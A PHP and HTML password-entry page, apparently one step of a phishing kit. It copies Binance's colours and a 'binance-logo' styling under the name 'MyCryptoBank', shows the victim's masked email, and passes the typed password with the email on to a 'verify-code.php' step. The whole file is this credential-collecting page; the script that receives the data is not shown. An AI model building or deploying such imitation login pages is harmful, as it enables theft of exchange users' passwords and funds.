<?php
function mask_email_or_phone($input) {
    if (filter_var($input, FILTER_VALIDATE_EMAIL)) {
        $parts = explode('@', $input);
        $name = $parts[0];
        $domain = $parts[1];
        $masked = substr($name, 0, 1) . str_repeat('*', max(0, strlen($name)-1));
        return $masked . '@' . $domain;
    } else {
        // Mask phone: show last 2 digits only
        $len = strlen($input);
        if ($len <= 2) return str_repeat('*', $len);
        return str_repeat('*', $len-2) . substr($input, -2);
    }
}
$email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : '';
$masked = $email ? mask_email_or_phone($email) : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Enter your password</title>
  <style>
    body {
      font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
      background: #181A20;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .password-container {
      background: #1E2329;
      border-radius: 24px;
      box-shadow: 0 0 16px 0 rgba(0,0,0,0.4);
      padding: 48px 36px 36px 36px;
      width: 100%;
      max-width: 420px;
      color: #fff;
      position: relative;
    }
    .binance-logo {
      display: flex;
      align-items: center;
      margin-bottom: 18px;
      justify-content: center;
    }
    .binance-logo img {
      height: 32px;
      width: 32px;
      margin-right: 8px;
      border-radius: 6px;
    }
    .binance-logo span {
      font-size: 22px;
      font-weight: 700;
      color: #F0B90B;
      letter-spacing: 1px;
    }
    .password-container h2 {
      font-size: 32px;
      font-weight: 700;
      margin-bottom: 8px;
      color: #fff;
      text-align: left;
    }
    .masked-email {
      color: #b7bdc6;
      font-size: 17px;
      margin-bottom: 28px;
      margin-left: 2px;
    }
    .form-group {
      margin-bottom: 18px;
    }
    .form-group label {
      display: block;
      font-size: 15px;
      margin-bottom: 6px;
      color: #fff;
      font-weight: 600;
    }
    .password-input-wrapper {
      position: relative;
      width: 100%;
    }
    .form-group input[type="password"],
    .form-group input[type="text"].show {
      width: 100%;
      padding: 13px 44px 13px 14px;
      font-size: 16px;
      border: 2px solid #F0B90B;
      border-radius: 8px;
      background: #181A20;
      color: #fff;
      margin-bottom: 0;
      outline: none;
      transition: border-color 0.3s;
      box-sizing: border-box;
    }
    .form-group input[type="password"]:focus,
    .form-group input[type="text"].show:focus {
      border-color: #e5a800;
    }
    .toggle-password {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      color: #848E9C;
      font-size: 20px;
      padding: 0;
      display: flex;
      align-items: center;
    }
    .password-btn {
      width: 100%;
      padding: 15px 0;
      background: #F0B90B;
      color: #181A20;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 18px;
      transition: background 0.2s;
    }
    .password-btn:hover {
      background: #e5a800;
    }
    .forgot-link {
      text-align: center;
      color: #F0B90B;
      font-size: 16px;
      font-weight: 600;
      margin-top: 10px;
      text-decoration: none;
      display: block;
    }
    .forgot-link:hover {
      text-decoration: underline;
    }
    @media (max-width: 768px) {
      .password-container {
        max-width: 98vw;
        padding: 24px 8vw 20px 8vw;
        border-radius: 12px;
      }
      .binance-logo img {
        height: 26px;
        width: 26px;
      }
      .binance-logo span {
        font-size: 17px;
      }
      .password-container h2 {
        font-size: 22px;
      }
      .masked-email {
        font-size: 14px;
      }
      .password-btn {
        font-size: 15px;
        padding: 10px 0;
        border-radius: 7px;
      }
      .forgot-link {
        font-size: 13px;
      }
    }
    @media (max-width: 480px) {
      .password-container {
        padding: 10px 2vw 10px 2vw;
        border-radius: 0;
        min-width: unset;
        box-shadow: none;
      }
      .binance-logo img {
        height: 20px;
        width: 20px;
      }
      .binance-logo span {
        font-size: 13px;
      }
      .password-container h2 {
        font-size: 16px;
        margin-bottom: 10px;
      }
      .masked-email {
        font-size: 11px;
        margin-bottom: 12px;
      }
      .form-group label {
        font-size: 11px;
      }
      .form-group input[type="password"],
      .form-group input[type="text"].show {
        font-size: 12px;
        padding: 8px 44px 8px 8px;
        border-radius: 5px;
      }
      .password-btn {
        font-size: 12px;
        padding: 8px 0;
        border-radius: 5px;
        margin-bottom: 10px;
      }
      .forgot-link {
        font-size: 11px;
        margin-top: 6px;
      }
    }
  </style>
</head>
<body>
  <div class="password-container">
    <div class="binance-logo">
      <img src="./img/logo.jpg" alt="logo">
      <span>MyCryptoBank</span>
    </div>
    <h2>Enter your password</h2>
    <div class="masked-email"><?php echo $masked; ?></div>
    <form action="verify-code.php" method="POST">
      <div class="form-group">
        <label for="password">Password</label>
        <div class="password-input-wrapper">
          <input type="password" id="password" name="password" required>
          <button type="button" class="toggle-password" onclick="togglePassword()" tabindex="-1" aria-label="Show/Hide Password">
            <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#848E9C" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/></svg>
          </button>
        </div>
      </div>
      <input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>">
      <button class="password-btn" type="submit">Next</button>
    </form>
    <a href="#" class="forgot-link">Forgot password?</a>
  </div>
  <script>
    function togglePassword() {
      var input = document.getElementById('password');
      var icon = document.getElementById('eyeIcon');
      if (input.type === 'password') {
        input.type = 'text';
        icon.innerHTML = '<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.81 21.81 0 0 1 5.06-5.94M1 1l22 22" stroke="#848E9C" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/><circle cx="12" cy="12" r="3"/>';
      } else {
        input.type = 'password';
        icon.innerHTML = '<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>';
      }
    }
  </script>
</body>
</html> 